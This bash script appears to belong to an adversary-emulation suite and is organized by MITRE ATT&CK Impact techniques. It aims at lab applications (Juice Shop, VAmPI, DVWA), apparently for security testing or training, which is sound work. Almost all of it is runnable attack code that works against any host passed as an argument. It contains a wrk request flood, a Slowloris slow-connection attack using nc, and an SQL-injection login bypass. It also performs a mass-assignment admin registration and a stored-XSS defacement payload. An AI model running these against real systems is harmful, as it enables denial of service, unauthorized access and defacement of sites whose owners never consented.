#!/bin/bash
# MITRE ATT&CK: Impact (TA0040)
# Techniques: T1498 Network DoS, T1499 Endpoint DoS, T1491 Defacement,
#             T1565 Data Manipulation
# Tools: curl, hping3, wrk
set -uo pipefail

TARGET="${1:?Usage: 07-impact.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] MITRE ATT&CK TA0040: Impact against ${TARGET}"
echo ""

echo "=== T1499.002: Endpoint DoS — Service Exhaustion Flood ==="
echo "    Technique: High-volume requests to exhaust application resources"
echo "    Duration: 15 seconds, 500 concurrent connections"
result=$(wrk -t2 -c"${TGEN_CONCURRENCY:-20}" -d15s "${BASE}/juice-shop/rest/products/search?q=test" 2>&1)
rps=$(echo "$result" | grep "Requests/sec" | awk '{print $2}')
to=$(echo "$result" | grep "timeout" | grep -oP "timeout \K\d+")
echo "  Throughput: ${rps:-N/A} req/s | Timeouts: ${to:-0}"
echo ""

echo "=== T1499.003: Endpoint DoS — Application Exhaustion ==="
echo "    Technique: Slowloris-style slow HTTP attack (15s)"
SLOWLORIS_CONNS="${TGEN_SLOW_CONNECTIONS:-20}"
PIDS=()
for i in $(seq $SLOWLORIS_CONNS); do
  (
    {
      echo "GET /juice-shop/ HTTP/1.1"
      echo "Host: ${TARGET}"
      echo "User-Agent: Mozilla/5.0 (Slowloris)"
      for j in $(seq 1 3); do
        sleep 5
        echo "X-Slow-${j}: keep-alive-$(date +%s)"
      done
    } | nc -q0 "$TARGET" 80 2>/dev/null || true
  ) &
  PIDS+=($!)
done
echo "  Opened ${SLOWLORIS_CONNS} slow connections..."
sleep 15
for pid in "${PIDS[@]}"; do kill "$pid" 2>/dev/null; done
wait 2>/dev/null
echo "  Slowloris attack completed"
echo ""

echo "=== T1565.001: Data Manipulation — Stored Data ==="
echo "    Technique: Inject malicious content via stored XSS / API manipulation"

echo "  [T1565.a] Injecting fake product review via Juice Shop API:"
token=$(curl -sf -X POST "${BASE}/juice-shop/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\''--","password":"x"}' --max-time 10 2>/dev/null | jq -r '.authentication.token' 2>/dev/null)
if [[ -n "$token" ]] && [[ "$token" != "null" ]]; then
  code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/api/Feedbacks" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${token}" \
    -d '{"comment":"[MITRE T1565] Data manipulation test - injected feedback","rating":1}' \
    --max-time 10) || code="ERR"
  echo "  [VULN] Feedback injection: HTTP ${code}"
else
  echo "  [INFO] Could not obtain auth token for injection test"
fi

echo ""
echo "  [T1565.b] VAmPI mass assignment (privilege escalation):"
ts=$(date +%s)
curl -sf -X POST "${BASE}/vampi/users/v1/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"mitre${ts}\",\"password\":\"test123\",\"email\":\"mitre${ts}@test.com\",\"admin\":true,\"role\":\"admin\"}" \
  --max-time 10 2>/dev/null | jq -c '.' 2>/dev/null
echo ""

echo "=== T1491.002: Defacement — External Defacement ==="
echo "    Technique: XSS stored payload for persistent page modification"
echo "  [T1491] Stored XSS via DVWA guestbook (requires auth):"
code=$(curl -sf -o /dev/null -w "%{http_code}" \
  -d "txtName=MITRE&mtxMessage=<h1>Defaced by T1491</h1>&btnSign=Sign+Guestbook" \
  "${BASE}/dvwa/vulnerabilities/xss_s/" --max-time 10) || code="ERR"
echo "  Guestbook injection: HTTP ${code} (302=needs auth, 200=injected)"
echo ""

echo "[*] TA0040 Impact complete"
